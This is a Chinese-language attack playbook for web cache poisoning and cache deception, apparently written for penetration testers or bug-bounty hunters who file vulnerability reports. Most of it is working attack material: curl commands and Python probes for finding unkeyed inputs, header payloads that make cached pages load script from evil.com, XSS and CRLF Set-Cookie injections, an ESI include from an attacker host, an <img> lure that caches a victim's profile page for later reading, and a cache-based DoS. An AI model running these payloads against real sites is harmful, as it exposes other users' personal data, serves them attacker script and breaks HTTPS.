## 0. 判据速查

| 现象 | 判据 | 打法 |
|---|---|---|
| 响应有 `X-Cache` / `cf-cache-status` / `Age` / `Via` / `X-Varnish` | 存在缓存层，可继续 | 先定键，再找 unkeyed |
| 加唯一 query 后第二次仍 HIT 且内容相同 | query 不在键内 | 该参数是 unkeyed 通道 |
| 加唯一 header 后，**干净请求**能读到该值 | 该 header 是 unkeyed | 反射点决定危害（JS/CSS/canonical/og/`Location`） |
| 登录后个人页、账单、`/api/me`、设置页 | 缓存欺骗的候选面 | 加 `.css` 后缀，未登录读回正文 |
| 应用忽略尾段但 CDN 按扩展名缓存 | 规范化差异 = 欺骗成立 | `/path/x.css`、`/path;.css`、`/path%2f.css` |
| `X-Forwarded-Scheme: http` 让 301 指向 http | 降级可缓存 | 缓存后全站 MITM |
| `Vary` 缺 `Cookie` 而内容是个人化的 | 跨用户命中 | 等价于无需诱导的欺骗 |
| 只 HIT 了 CSS 壳，正文是公开的 | **不算** | 继续找正文含个人数据的面 |

## 1. 先分型：投毒 vs 欺骗

两者**不是一类**，判据与危害都不同，别混着写报告。

| 维度 | 缓存投毒 | 缓存欺骗 |
|---|---|---|
| 目的 | 给**所有人**下发恶意内容 | 偷**受害者本人**的认证数据 |
| 谁触发 | 攻击者主动发投毒请求 | 受害者访问构造 URL |
| 缓存里存什么 | 攻击者控制的响应 | 受害者的认证响应 |
| 谁受害 | 所有命中缓存的用户 | 被缓存的那一个受害者 |
| 关键手法 | unkeyed 输入操纵 | 路径混淆 / 后缀追加 |
| 检测信号 | 响应出现非预期注入 | 未认证可读到认证内容 |

```text
投毒: 攻击者 --X-Forwarded-Host: evil.com--> 缓存存下含 evil.com 的响应 --> 普通用户吃毒
欺骗: 攻击者诱导受害者访问 /profile/x.css --> 应用忽略 x.css 返回个人页 --> 缓存当静态存下 --> 攻击者读回
```

## 2. 缓存键判定

缓存键 = 决定"这条缓存属于谁"的输入集合。典型含 `Host`、path、query（有时）；**典型不含**：多数请求头、Cookie（有时）、GET 的 body。

判据只有一条：**某输入不在键内、但影响响应 → 可投毒。**

### 2.1 识别缓存层

```bash
curl -I "https://target.com/page" -H "X-Test: 1"
curl -I "https://target.com/page" -H "X-Test: 2"
```

关注：`X-Cache: HIT/MISS`、`cf-cache-status`、`Age`（缓存年龄）、`Cache-Control: max-age=`。

### 2.2 判键：改一个维度，看是否 MISS

```python
import random, requests

def detect_cache_key(url):
    """返回各维度是否在缓存键中：改动后变 MISS 说明在键内"""
    probes = {
        "Host":  ("header", {"Host": f"t{random.randint(1000,9999)}.com"}),
        "Path":  ("path",   f"/t{random.randint(1000,9999)}"),
        "Query": ("path",   f"?t={random.randint(1000,9999)}"),
        "Method":("post",   None),
        "Body":  ("postd",  f"t={random.randint(1000,9999)}"),
    }
    out = {}
    for name, (kind, val) in probes.items():
        requests.get(url)                      # 先建立缓存
        if kind == "header":
            r = requests.get(url, headers=val)
        elif kind == "path":
            r = requests.get(url + val)
        elif kind == "post":
            r = requests.post(url)
        else:
            r = requests.post(url, data=val)
        out[name] = "在键内" if r.headers.get("X-Cache") == "MISS" else "不在键内"
    return out
```

### 2.3 找 unkeyed：canary 回读法

唯一正确的验证方式——**发一次带 canary 的请求，再发一次干净请求，看干净响应里有没有 canary**。

```bash
# 1) 带 canary
curl -s -H "X-Forwarded-Host: canary123.com" https://target.com/ | grep canary123
# 2) 干净请求
curl -s https://target.com/ | grep canary123
# 干净请求里也有 → 已投毒成功，不是"疑似"
```

```python
def test_unkeyed(url, header, value):
    canary = f"{value}-c4n4ry"
    r1 = requests.get(url, headers={header: canary})
    if canary not in r1.text:
        return False                 # 不反射，这条通道死了
    r2 = requests.get(url)           # 干净请求
    return canary in r2.text         # 干净请求还能读到 = unkeyed + 已缓存
```

## 3. 缓存欺骗（偷会话页）

### 3.1 缓存欺骗偷会话页（短表有指针）

认：登录后个人页、账单、`/api/me`、设置页。有 `X-Cache` / `Age` / `Via` 更好认，**不是前提**。

打：

1. 未登录先打原 path，记下基线（应 401 / 登录页 / 空）。
2. **要会话**打开同一页，再请求 `原path/x.css`、`原path;.css`、`原path%2f.css`。
3. 看 `X-Cache: HIT` / `Age` 涨了没有。再**未登录**打同一个带后缀 URL。

算成：未登录拿到**别人**个人页/账单/会话页正文（姓名、手机、Cookie 页）。只 HIT 了 CSS 壳不算。

假点：`Cache-Control: no-store`；后缀被应用 404；要受害人先点才缓存、你这边没拿到他人数据。单站没中不删短表这行。有会话页就可以打，不必先看见缓存头。没个人页/账单不要为了勾表空加后缀。

### 3.2 可缓存的扩展名

CDN 一般按扩展名判静态：`.css .js .jpg .png .gif .svg .ico .woff .woff2 .ttf .pdf`（`.json` 视配置）。

### 3.3 后缀变形清单

```text
原 path:      /account/profile
追加后缀:     /account/profile/x.css
             /account/profile/x.js
             /account/profile/x.png
分号:         /account/profile;.css        # 部分框架当 path parameter 剥掉
编码分隔符:   /account/profile%2F.css
             /account/profile%2f.css
尾点/空格:    /account/profile/.css
             /account/profile%20.css
穿越式:       /account/profile/..%2fstatic/app.css
```

### 3.4 验证三连

```bash
# 1) 带受害者会话请求带后缀 URL → 应 MISS，且正文是个人数据
curl -s -H "Cookie: session=VICTIM" https://target.com/account/profile/x.css

# 2) 看头
#    X-Cache: MISS   Age: 0

# 3) 无会话再打同一个 URL
curl -s https://target.com/account/profile/x.css
#    X-Cache: HIT 且正文含受害者数据 → 成立
```

### 3.5 诱导投递

受害者只要"打开一次"就够，用 `<img>` 即可（不要求同源，只要求带上 Cookie）：

```html
<img src="https://target.com/account/profile/tracking.gif">
```

## 4. 缓存投毒（改别人看到的页面）

### 4.1 unkeyed 头清单

```text
X-Forwarded-Host      X-Forwarded-Scheme    X-Forwarded-Proto
X-Forwarded-Port      X-Forwarded-Server    X-Forwarded-For
X-Original-URL        X-Rewrite-URL         X-Host
Forwarded             True-Client-IP        X-Real-IP
CF-Connecting-IP      CF-IPCountry          CF-Visitor
```

### 4.2 反射点决定危害

同一个 unkeyed 头，落在不同位置，危害差一个数量级：

| 反射点 | 危害 |
|---|---|
| `<script src="...">` / `<link href="...">` | 全站加载攻击者 JS → 存储型 XSS |
| `<meta property="og:url">` / `og:image` | 钓鱼预览、SEO 劫持 |
| `<link rel="canonical" href="...">` | 规范化重定向、SEO 劫持 |
| `<link rel="dns-prefetch">` / `prefetch` | 外连泄漏、资源失效 |
| import map / 动态 import | 任意模块替换 |
| `Location` 响应头 | 开放重定向、降级 |
| 响应头任意字段 | 响应头注入（`Set-Cookie` 注入） |

### 4.3 各头的典型效果

**`X-Forwarded-Host`（最常见）**

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```
```html
<script src="https://evil.com/static/app.js"></script>
```

**`X-Forwarded-Scheme` / `X-Forwarded-Proto`** — 强制降级：

```http
GET / HTTP/1.1
X-Forwarded-Scheme: http
```
```http
HTTP/1.1 301 Moved
Location: http://target.com/        ← 缓存后全站走 HTTP
```

**`X-Original-URL` / `X-Rewrite-URL`** — IIS/ASP.NET、Symfony 用它覆盖路由：

```http
GET /normal-page HTTP/1.1
X-Original-URL: /admin/secret
```
键是 `GET /normal-page`，后端处理的是 `/admin/secret`，响应被存到 `/normal-page` 下。

**`X-Forwarded-Port`** — 端口进绝对 URL，制造资源加载失败：

```http
X-Forwarded-Port: 1337
→ <a href="https://target.com:1337/path">
```

**双 `Host`** — 部分缓存键第一个、部分应用取最后一个：

```http
Host: target.com
Host: evil.com
```

## 5. 参数与请求体通道

### 5.1 unkeyed 参数

营销/埋点参数常被排除出键，却仍在页面回显：

```text
utm_content  utm_source  utm_medium  utm_campaign  utm_term
fbclid  gclid  dclid  msclkid  _ga  mc_eid  ref
callback  jsonp  cb  _
```

```http
GET /page?utm_content="><script>alert(1)</script> HTTP/1.1
```
```html
<a href="/page?utm_content="><script>alert(1)</script>">Share</a>
```

键是 `GET /page`，响应带 payload → 所有访问 `/page` 的用户中招。

**判键小实验**：先打 `/page?cachebuster=abc123`，再打 `/page`——后者若 HIT 且内容与前者一致，说明 query 被排除；若 MISS，则 query 在键内。

`callback` 回显进 JS 时更狠：

```http
GET /page?callback=alert(document.cookie)// HTTP/1.1
→ var config = { callback: "alert(document.cookie)//" };
```

### 5.2 Fat GET（body 参与渲染但不在键内）

部分源站处理 GET 的 body（RFC 不建议，实现照做），而缓存不看 body：

```http
GET /api/config HTTP/1.1
Content-Type: application/x-www-form-urlencoded

callback=alert(1)
```
```http
HTTP/1.1 200 OK
Content-Type: application/javascript
Cache-Control: public, max-age=3600

alert(1)({"theme":"default","lang":"en"})
```

| 框架 | GET body |
|---|---|
| Rails | 解析（默认） |
| Django | `request.POST` 对 GET+body 也有值 |
| Flask | `request.form` 可用 |
| Express | 取决于 body-parser 中间件 |
| ASP.NET | 取决于 model binding |
| Spring | 取决于 `@RequestBody` |

验证：`curl -X GET ... -d "p=canary"` 看 canary 是否出现在响应里；再干净 GET 看是否仍存在。

### 5.3 参数遮蔽（分隔符与重复键解析不一致）

```http
GET /page?legit=value;poison=xss HTTP/1.1
```
Rails 拆成两个参数，PHP 当一个字面值，Varnish 把整串当不透明键。**缓存按整串做键、后端按 `;` 拆** → 只有这一个"合法外观"的 URL 被投毒。

| 平台 | `;` | `&` |
|---|---|---|
| PHP | 字面值 | 分隔符 |
| Rails | 分隔符 | 分隔符 |
| Java Servlet | 分隔符（path 内为 path parameter） | 分隔符 |
| ASP.NET | 视配置 | 分隔符 |
| Node querystring | 字面值 | 分隔符 |
| Python urllib | 可配置 | 分隔符 |

**重复参数**：缓存取第一个、后端取最后一个，就是一条投毒通道。

```http
GET /page?param=safe&param=<script>alert(1)</script>
```

| 平台 | 重复键 |
|---|---|
| PHP | 后者覆盖 |
| Rails | 后者覆盖 |
| Flask | 前者优先 |
| ASP.NET | 逗号拼接两者 |
| Java Servlet | `getParameter` 取首个，`getParameterValues` 取全部 |
| Express | 数组 |

**路径内参数**：Tomcat/Jetty 剥掉 `;jsessionid=...`，缓存未必同样处理。

```http
GET /page;jsessionid=abc;param=value HTTP/1.1
```

## 6. 规范化差异

缓存与应用对同一 URL 的理解不一致，就是绕过与投毒的根源。

```text
# 应用视为等价
/account/profile
/account/profile/anything
/account/profile/x.css
/account/profile;.css

# 缓存把 .css 当可缓存静态资源
→ 不一致 = 漏洞
```

| 组件 | 行为 |
|---|---|
| CDN | 按完整 path（含扩展名）做键 |
| 应用（Rails/Django/Express） | 可能忽略尾段或扩展名 |
| 反代（Nginx） | 可能先 strip/rewrite 再转发 |

编码差异也可绕过缓存直取应用：

```bash
curl "https://target.com/page?param=value"
curl "https://target.com/page?param=%76%61%6c%75%65"   # 缓存视为不同键，应用解出同值
```

路径形态差异：

```bash
curl "https://target.com/page"
curl "https://target.com/./page"
curl "https://target.com//page"
curl "https://target.com/page/"
```

## 7. Vary 与缓存分区

`Vary` 告诉缓存"这个响应随哪些请求头变化"，列出的头会进入键。

```http
Vary: Accept-Encoding, Accept-Language
```

**缺 Vary = 漏洞**：应用按 `User-Agent` 返回移动/桌面版，但 `Vary` 没列 `User-Agent`，缓存只存一份 → 用桌面版毒掉移动用户（或反之）。

**缺 `Vary: Cookie` 最狠**：个人化页面被缓存后，B 用户直接读到 A 的页面——不需要诱导受害者访问构造 URL，等同于免费拿到欺骗效果。

**Vary 注入（分区投毒）**：若 Vary 值受请求影响，攻击者加一个唯一头，把毒投进只属于自己的分区，再把带同一头的 URL 发给受害者，避免毒到无关用户。

```http
GET / HTTP/1.1
X-Custom-Header: unique-value
→ Vary: Accept-Encoding, X-Custom-Header
```

**`Vary: *`** 表示永不使用缓存，但实现不一：

| CDN | `Vary: *` |
|---|---|
| Cloudflare | 不缓存 |
| CloudFront | 不缓存 |
| Varnish | 看 VCL |
| Nginx | 默认不缓存 |

## 8. CDN 行为对照

| CDN | 缓存状态头 | 默认键 | query 默认 | Cookie 默认 |
|---|---|---|---|---|
| Cloudflare | `cf-cache-status`（HIT/MISS/EXPIRED/DYNAMIC/BYPASS） | Host + path + query | 在键内 | 不在键内 |
| CloudFront | `x-cache`（Hit/Miss from cloudfront）、`x-amz-cf-id`、`x-amz-cf-pop` | Host + path（query 需配置） | **默认不在键内** | 不在键内 |
| Akamai | `X-Cache`（TCP_HIT/TCP_MISS）、`X-Akamai-Request-ID` | Host + path + query | 在键内 | 不在键内 |
| Varnish | `X-Varnish`（两个 ID=HIT，一个=MISS）、`Age`、`Via` | `req.url`（VCL `hash_data()` 可改） | 在键内 | 带 Cookie 默认不缓存 |
| Fastly | `X-Cache`、`X-Served-By`、`X-Cache-Hits`、`X-Timer` | Host + URL | 在键内 | 不在键内 |
| Nginx `proxy_cache` | 自定义 | `$scheme$proxy_host$request_uri` | 在键内 | 不在键内 |

各家的高价值细节：

- **Cloudflare**：Page Rules 可强制缓存 HTML/API；Workers 能改键；`CF-Connecting-IP`、`CF-IPCountry`、`CF-Visitor` 通常 unkeyed 且可能回显；`__cf_chl_jschl_tk__` 不在键内。
- **CloudFront**：默认 **query 与 Cookie 都不在键内**——这是最容易踩的投毒面；Cache Policy 可白名单头/Cookie 进键。
- **Akamai**：`Pragma: akamai-x-cache-on` 开调试、`Pragma: akamai-x-get-cache-key` **直接吐缓存键**（调试开启时）：

  ```bash
  curl -H "Pragma: akamai-x-get-cache-key" https://target.com/ -v
  ```

  `True-Client-IP` 通常 unkeyed；有"Remove Vary Header"功能会把 Vary 抹掉。
- **Varnish**：`obj.hits` 看命中次数；命中时 `If-Modified-Since` 被剥；有 VCL 就读 `vcl_hash`：

  ```text
  sub vcl_hash {
    hash_data(req.url);
    hash_data(req.http.host);
  }
  ```
- **Fastly**：底层是 Varnish，VCL 配置；`Surrogate-Control` 覆盖 `Cache-Control`；`Fastly-Debug: 1` 暴露细节；支持 ESI（攻击面）。

## 9. 进阶打法

**错误页投毒** — 404 页回显请求路径且被缓存：

```http
GET /nonexistent%0D%0AX-Injected:%20yes HTTP/1.1
```

**ESI 注入** — CDN 解析 ESI 标签，等于在边缘执行指令：

```http
X-Forwarded-Host: evil.com
→ <esi:include src="http://evil.com/xss.html"/>
```

**响应头注入** — unkeyed 头带 CRLF 进响应头，缓存后全站吃到注入的 `Set-Cookie`：

```http
X-Custom: value\r\nSet-Cookie: admin=true
```

**DoS** — 让源站去拉一个不存在的域名，响应里全是坏资源，缓存后全站白屏：

```http
X-Forwarded-Host: thisdoesnotexist.com
```

**链 XSS** — unkeyed 头未过滤直接拼进 HTML：

```http
X-Forwarded-Host: "><script>alert(document.cookie)</script>.com
→ <link rel="canonical" href="https://"><script>alert(document.cookie)</script>.com/page">
```

## 10. 工具与检查清单

**Param Miner**（Burp）：`Extender → BApp Store → Param Miner`，右键 `Extensions → Param Miner → Guess headers` / `Guess query parameters`，自动扫 unkeyed 头与参数。

手工脚本见 §2.2、§2.3，核心永远是「canary 回读」而非「响应里有我发的值」。

```text
□ 认缓存层：X-Cache / cf-cache-status / Age / Via / X-Varnish / X-Served-By
□ 定键：加 query / header / cookie，看是否 MISS
□ 找 unkeyed 头：X-Forwarded-Host、X-Forwarded-Scheme、X-Original-URL、True-Client-IP
□ 找 unkeyed 参数：utm_*、fbclid、gclid、callback、jsonp
□ 试 GET body（Fat GET）
□ 定位反射点：HTML 正文 / JS / 响应头 / Location
□ 干净请求回读 canary → 确认投毒成立
□ 参数遮蔽：; 分隔符差异、重复键取舍
□ Vary：个人化内容是否缺 Vary: Cookie？Vary 值可否被影响？
□ 缓存欺骗：有会话页就打 .css / ;.css / %2f.css，未登录读回正文
□ CDN 专项：ESI 是否开、调试头是否开、键能否被打印
□ 定危害：存储型 XSS / 会话劫持 / 降级 MITM / DoS
```

## 11. 纪律

1. **先判键，再谈投毒**。没有「干净请求回读到 canary」就不算投毒，只能写"存在缓存层"。
2. **只 HIT 了静态壳不算欺骗**。必须拿到他人正文（姓名、手机、账单、会话页）。
3. **投毒与欺骗分开写**。目的、触发者、受害者都不同，混写会被判描述不准。
4. **不要为勾表空加后缀**。站内没有会话个人页/账单/`/api/me`，就不要硬造 `.css` 测试项。
5. **`X-Forwarded-Host` 是头号漏点，不是唯一漏点**。`X-Original-URL`、`True-Client-IP`、`X-Forwarded-Port` 常被漏掉。
6. **CloudFront 默认不吃 query/Cookie**，看到 CloudFront 先试 unkeyed 参数，命中率最高。
7. **降级也是危害**。`X-Forwarded-Scheme: http` 缓存的 301 就是全站 MITM 入口，别只盯 XSS。
8. **报告只认 `rules/vuln-report-format.md`**，本页只提供判据与手法。
